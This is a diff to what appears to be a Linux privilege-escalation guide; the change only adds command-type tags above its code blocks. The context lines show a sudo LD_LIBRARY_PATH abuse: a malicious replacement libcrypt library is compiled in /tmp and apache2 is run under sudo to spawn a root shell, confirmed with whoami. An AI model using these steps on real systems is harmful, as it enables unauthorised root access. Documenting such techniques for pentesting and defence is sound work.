@@ -20,6 +20,7 @@ env_keep+=LD_LIBRARY_PATH
 
 ### 1. Identify a shared library the binary loads
 
+<!-- cmd: linux -->
 ```bash
 ldd /usr/sbin/apache2
 # libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1
@@ -27,6 +28,7 @@ ldd /usr/sbin/apache2
 
 ### 2. Create a malicious replacement library
 
+<!-- cmd: linux -->
 ```bash
 cat > /tmp/evil.c << EOF
 #include <stdio.h>
@@ -45,6 +47,7 @@ gcc -shared -fPIC -o /tmp/libcrypt.so.1 /tmp/evil.c
 
 ### 3. Execute the allowed command with LD_LIBRARY_PATH pointing to /tmp
 
+<!-- cmd: linux -->
 ```bash
 sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
 # → root shell spawned before apache2 initialises
@@ -52,6 +55,7 @@ sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc
 
 ## Verification
 
+<!-- cmd: linux -->
 ```bash
 whoami
 # root
